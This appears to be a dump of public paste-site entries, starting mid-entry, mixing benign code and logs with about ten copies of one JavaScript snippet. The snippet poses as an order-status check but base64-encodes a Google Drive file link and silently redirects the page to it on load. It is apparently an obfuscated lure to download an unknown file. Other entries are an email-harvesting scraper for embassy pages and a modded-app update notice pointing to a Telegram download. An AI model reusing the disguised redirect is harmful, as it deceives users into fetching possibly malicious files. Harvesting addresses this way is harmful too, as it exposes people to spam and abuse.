  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LGbgBEXk,Market.js,kammex,JavaScript,Friday 11th of April 2025 03:55:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38791/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eKhJupPS,Untitled,pb6106,Lua,Friday 11th of April 2025 03:51:15 PM CDT,"function list_get_random(t)
  return t[math.random(#t)]
end


while 123 == 123 do
  write(peripheral.call(""""bottom"""",""'write'"",""list_get_random(({'All good!', 'Watching Steam Generator', 'Checking Critical Systems', ':3', 'Checking Atmosphere', 'Checking Airlocks', 'WARN ALARM', 'ERROR ALARM', 'Sending logs to ERTH', 'Energy Storage: Optimal'}))""))
  sleep(1)
end

local _ = item
"
EVuqZktZ,Next/Font no require() on ESM Graph with top-level await,DerJackLive,Bash,Friday 11th of April 2025 03:47:36 PM CDT,"jackr@Jacks-PC MINGW64 /d/dev/DJL Foundation/djl-homepage (main)
$ pnpm build

> djl-homepage@0.1.0 build D:\dev\DJL Foundation\djl-homepage
> next build

   ▲ Next.js 15.3.0
   - Environments: .env
   - Experiments (use with caution):
     · clientTraceMetadata

   Creating an optimized production build ...
<w> [webpack.cache.PackFileCacheStrategy] Serializing big strings (245kiB) impacts deserialization performance (consider using Buffer instead and decode when needed)
Failed to compile.

src\app\layout.tsx
An error occurred in `next/font`.

Error: require() cannot be used on an ESM graph with top-level await. Use import() instead. To see where the top-level await comes from, use --experimental-print-required-tla.
  From D:\dev\DJL Foundation\djl-homepage\node_modules\.pnpm\next@15.3.0_@babel+core@7.2_905506496932c581dfc14a516f096b03\node_modules\next\dist\build\webpack\config\blocks\css\plugins.js
  Requiring D:\dev\DJL Foundation\djl-homepage\node_modules\.pnpm\prettier-plugin-tailwindcss@0.6.11_prettier@3.5.3\node_modules\prettier-plugin-tailwindcss\dist\index.mjs
    at ModuleJobSync.runSync (node:internal/modules/esm/module_job:397:13)
    at ModuleLoader.importSyncForRequire (node:internal/modules/esm/loader:427:47)
    at loadESMFromCJS (node:internal/modules/cjs/loader:1565:24)
    at Module._compile (node:internal/modules/cjs/loader:1716:5)
    at Object..js (node:internal/modules/cjs/loader:1899:10)
    at Module.load (node:internal/modules/cjs/loader:1469:32)
    at Function._load (node:internal/modules/cjs/loader:1286:12)
    at TracingChannel.traceSync (node:diagnostics_channel:322:14)
    at wrapModuleLoad (node:internal/modules/cjs/loader:235:24)
    at Module.<anonymous> (node:internal/modules/cjs/loader:1491:12)


> Build failed because of webpack errors
 ELIFECYCLE  Command failed with exit code 1."
KXYWP1c8,Untitled,kammex,JavaScript,Friday 11th of April 2025 03:40:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21636/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
THCuqeat,2025-04-11T15:29:33.469536,powerampache,PHP,Friday 11th of April 2025 03:29:32 PM CDT,"1.01-78 (78) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
cYzkeb9f,Products.js,kammex,JavaScript,Friday 11th of April 2025 03:24:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31926/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tVqgWTxX,Titanic2,Korotkodul,Python,Friday 11th of April 2025 03:21:48 PM CDT,"import numpy as np
import pandas as pd
import seaborn as sns

titanic_data = sns.load_dataset(""titanic"")
print(titanic_data)
print()

#Часть 1
print(""PART1\n"")
zero_cnt = np.sum(titanic_data.isnull(), axis = 0)
print(""zero_cnt:\n"", zero_cnt)
print()

#Часть 2
print(""\nPART2\n"")
#Удалите все столбцы, количество пропусков в которых превышает половину количества строк в таблице.
half_rows = titanic_data.shape[0] // 2
columns_to_drop = titanic_data.columns[zero_cnt > half_rows]
titanic_data = titanic_data.drop(columns=columns_to_drop)
print('columns_to_drop:', columns_to_drop, ""- удаляем эти столбцы"")
print()
#NB!Теперь работаем с titanic_cleaned

#После того, как вы удалите все столбцы, нарушающие описанное условие, удалите все строки, количество пропусков в которых превышает половину количества столбцов.
row_zero_cnt = np.sum(titanic_data.isnull(), axis = 1)
half_rows = titanic_data.shape[1] // 2
""""""
print(""shape:"", titanic_cleaned.shape)
print(type(row_zero_cnt))
print(row_zero_cnt)""""""
print(""half_rows:"",half_rows)
print(""Максимальное пропусков в строке:"", row_zero_cnt.max())
to_be_left = row_zero_cnt <= half_rows
#print(type(to_be_left))
#(to_be_left)
titanic_data =  titanic_data[to_be_left]
#print(titanic.shape)
print(""Вывод: мы не удалили ни одной строки"")
#NB!Теперь работаем с titanic

#Часть 3
print(""\nPART3\n"")
man_mask = (titanic_data['who'] == 'man')
#print(""man_mask\n"",male_mask)
man_age_median = np.median(titanic_data.loc[man_mask, 'age'].dropna()).round()
#print(""man_age_median:"", man_age_median)
#print()
titanic_data.loc[(titanic_data['who'] == 'man') & (titanic_data['age'].isna()), 'age'] = man_age_median

woman_mask = (titanic_data['who'] == 'woman')
woman_age_median = np.median(titanic_data.loc[woman_mask, 'age'].dropna()).round()
#print(""woman_age_median:"", woman_age_median)
#print()
titanic_data.loc[(titanic_data['who'] == 'woman') & (titanic_data['age'].isna()), 'age'] = woman_age_median

child_mask = (titanic_data['who'] == 'child')
child_age_median = np.median(titanic_data.loc[child_mask, 'age'].dropna()).round()
#print(""child_age_median:"", child_age_median)
#print()
titanic_data.loc[(titanic_data['who'] == 'child') & (titanic_data['age'].isna()), 'age'] = child_age_median

#Часть4
print(""\nPART4\n"")
null_counts = np.sum(titanic_data.isna(), axis=1)
#print(""Распределение пропусков по строкам:"")
#print(null_counts.value_counts().sort_index())
#print(null_counts)
mask = null_counts <= 1
#print(""mask:"", type(mask))
titanic_data = titanic_data[mask]


#Часть5
print(""\nPART5\n"")
city_cnt = titanic_data[""embark_town""].value_counts()
city = city_cnt.idxmax()
print(city)

#Часть 6
print(""\nPART6\n"")
#percent_of_surv1 = (titanic_data[""survived""].value_counts(normalize=True))[1]
#print(round(percent_of_surv1, 2))
surv_percent = np.round(titanic_data[""survived""].value_counts(normalize=True)[1] * 100, 2)
print(surv_percent)

#Часть7
print(""\nPART7\n"")
surv_cnt = titanic_data[titanic_data[""survived""]==1].groupby(""embarked"")[""survived""].count()
print(surv_cnt)

#Часть 8
print(""\nPART8\n"")
surv_class_cnt = titanic_data[titanic_data[""survived""]==1].groupby(""class"", observed=True)[""survived""].count()
print(surv_class_cnt)

#Часть 9
print(""\nPART9\n"")
surv_rich_percent = 100 * titanic_data.loc[titanic_data[""fare""] >= 100, ""survived""].value_counts(normalize=True)[1]
print(np.round(surv_rich_percent, 2))

#Часть 10
print(""\nPART10\n"")
child_alone = titanic_data.loc[(titanic_data[""who""] == ""child"") & (titanic_data[""alone""] == True)]
print(child_alone.shape)
print(child_alone)"
4RviG88s,Order.js,kammex,JavaScript,Friday 11th of April 2025 03:09:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fHEWJ5LP,Market.js,kammex,JavaScript,Friday 11th of April 2025 02:54:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eq11TWhc,embassy.py,ssoni,Python,Friday 11th of April 2025 02:47:08 PM CDT,"import requests
import re

# Download the HTML page
def getPage(url):
    response = requests.get(url)
    return response.text

def main():
    url = ""https://travel.state.gov/content/travel/en/us-visas/visa-information-resources/list-of-posts.html""
    topPage = getPage(url)
    links = re.findall(""href=\""(.+\.html)"", topPage)
    for link in links:
        fullURL = 'https://travel.state.gov' + link
        page = getPage(fullURL)
        emails = re.findall(""mailto: (\S+@\S+\.(gov|edu|com))"", page)
        for email in emails:
            print(email[0])

main()
"
CHj3gLiU,Untitled,kammex,JavaScript,Friday 11th of April 2025 02:38:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13478/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KqFcZswC,Polarr,Dj_Rabby,JSON,Friday 11th of April 2025 02:30:16 PM CDT,"{
  ""versionCode"": 1739529n756,
  ""versionName"": ""6.15.n3"",
  ""Msg"": ""This Update Has Been Expired Of The App.
If You Want To Use This App Then Please Update It.
Go To Our Telegram Channel.
And Download Latest Version Of This App.

What's new:
- Performance Improvements.
- Bug Fixes.
- New Features introduced.
- Others minor changes.
Thanks for using dear 🤞☺️"",
  ""downloadLink"": ""https://t.me/ModxV1""
  }"
UVf3ARHu,Products.js,kammex,JavaScript,Friday 11th of April 2025 02:22:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2dC84e14,Order.js,kammex,JavaScript,Friday 11th of April 2025 02:07:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/90384/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Y3ZWfYNP,Titanic1,Korotkodul,Python,Friday 11th of April 2025 02:07:31 PM CDT,"
import timeit

import numpy as np
import pandas as pd
import seaborn as sns

titanic_data = sns.load_dataset(""titanic"")
print(titanic_data)
print()

#Часть 1
print(""PART1\n"")
zero_cnt = titanic_data.isnull().sum()
print(""zero_cnt:\n"", zero_cnt)
print()

#Часть 2
print(""\nPART2\n"")
#Удалите все столбцы, количество пропусков в которых превышает половину количества строк в таблице.
half_rows = titanic_data.shape[0] // 2
columns_to_drop = titanic_data.columns[zero_cnt > half_rows]
titanic_cleaned = titanic_data.drop(columns=columns_to_drop)
print('columns_to_drop:', columns_to_drop, ""- удаляем эти столбцы"")
print()
#NB!Теперь работаем с titanic_cleaned

#После того, как вы удалите все столбцы, нарушающие описанное условие, удалите все строки, количество пропусков в которых превышает половину количества столбцов.
row_zero_cnt = titanic_cleaned.isnull().sum(axis = 1)
half_rows = titanic_cleaned.shape[1] // 2
""""""
print(""shape:"", titanic_cleaned.shape)
print(type(row_zero_cnt))
print(row_zero_cnt)""""""
print(""half_rows:"",half_rows)
print(""Максимальное пропусков в строке:"", row_zero_cnt.max())
to_be_left = row_zero_cnt <= half_rows
#print(type(to_be_left))
#(to_be_left)
titanic =  titanic_cleaned[to_be_left]
#print(titanic.shape)
print(""Вывод: мы не удалили ни одной строки"")
#NB!Теперь работаем с titanic

#Часть 3
print(""\nPART3\n"")
man_mask = (titanic['who'] == 'man')
#print(""man_mask\n"",male_mask)
man_age_median = titanic.loc[man_mask, 'age'].dropna().median()
print(""man_age_median:"", man_age_median)
print()
woman_mask = (titanic['who'] == 'woman')
woman_age_median = titanic.loc[woman_mask, 'age'].dropna().median()
print(""woman_age_median:"", woman_age_median)
print()
child_mask = (titanic['who'] == 'child')
child_age_median = titanic.loc[child_mask, 'age'].dropna().median()
print(""child_age_median:"", child_age_median)

"
AHtKcePL,Market.js,kammex,JavaScript,Friday 11th of April 2025 01:52:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33740/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0YhDD06x,2025-04-11T20:42:03.654,powerampache,PHP,Friday 11th of April 2025 01:42:04 PM CDT,"1.01-76 (76) - DB: 83
androidx.media3.datasource.HttpDataSource$InvalidResponseCodeException: Response code: 502
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:401)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:87)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1085)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:450)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:923)

onPlayerError Invalid response code 502 - Bad Gateway - HttpDataSource.InvalidResponseCodeException 
onPlayerError Invalid response code 502 - Bad Gateway
 {""headerFields"":{""null"":[""HTTP/1.1 502 Bad Gateway""],""Connection"":[""keep-alive""],""Content-Length"":[""157""],""Content-Type"":[""text/html""],""Date"":[""Fri, 11 Apr 2025 18:42:03 GMT""],""Referrer-Policy"":[""no-referrer""],""Server"":[""nginx/1.18.0""],""Strict-Transport-Security"":[""max-age\u003d31536000; includeSubDomains""],""X-Android-Received-Millis"":[""1744396923633""],""X-Android-Response-Source"":[""NETWORK 502""],""X-Android-Selected-Protocol"":[""http/1.1""],""X-Android-Sent-Millis"":[""1744396923584""],""X-Content-Type-Options"":[""nosniff""],""X-Download-Options"":[""noopen""],""X-Frame-Options"":[""SAMEORIGIN""],""X-Permitted-Cross-Domain-Policies"":[""none""],""X-Robots-Tag"":[""none""],""X-XSS-Protection"":[""1; mode\u003dblock""]},""responseBody"":[60,104,116,109,108,62,13,10,60,104,101,97,100,62,60,116,105,116,108,101,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,116,105,116,108,101,62,60,47,104,101,97,100,62,13,10,60,98,111,100,121,62,13,10,60,99,101,110,116,101,114,62,60,104,49,62,53,48,50,32,66,97,100,32,71,97,116,101,119,97,121,60,47,104,49,62,60,47,99,101,110,116,101,114,62,13,10,60,104,114,62,60,99,101,110,116,101,114,62,110,103,105,110,120,47,49,46,50,55,46,52,60,47,99,101,110,116,101,114,62,13,10,60,47,98,111,100,121,62,13,10,60,47,104,116,109,108,62,13,10],""responseCode"":502,""responseMessage"":""Bad Gateway"",""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
6i9S7rHW,Untitled,kammex,JavaScript,Friday 11th of April 2025 01:36:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15652/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pnZ5UDkq,Products.js,kammex,JavaScript,Friday 11th of April 2025 01:21:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/71534/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aSv1967w,Order.js,kammex,JavaScript,Friday 11th of April 2025 01:05:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94846/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
N2WtXWKn,BST insertion and searching,TOFSIR_IU,C++,Friday 11th of April 2025 12:53:43 PM CDT,"#include<bits/stdc++.h>
using namespace std;
#define endl ""\n"";
typedef struct tree
{
	int number;
	struct tree *leftChild;
	struct tree *rightChild;
}node;
node *root = NULL;
void insertNode(int value)
{
	node *tempNode;
	node *currentNode=NULL;
	node *parentNode=NULL;
	tempNode = (node *) malloc (sizeof(node));
	tempNode->number=value;
	if(root==NULL)
	{
		root=tempNode;
	}
	else
	{
		currentNode=root;
		while(1)
		{
			parentNode=currentNode;
			if(parentNode->number>value)
			{
				currentNode=parentNode->leftChild;
				if(currentNode==NULL)
				{
					parentNode->leftChild=tempNode;
					return;
				}
			}
			else
			{
				currentNode=parentNode->rightChild;
				if(currentNode==NULL)
				{
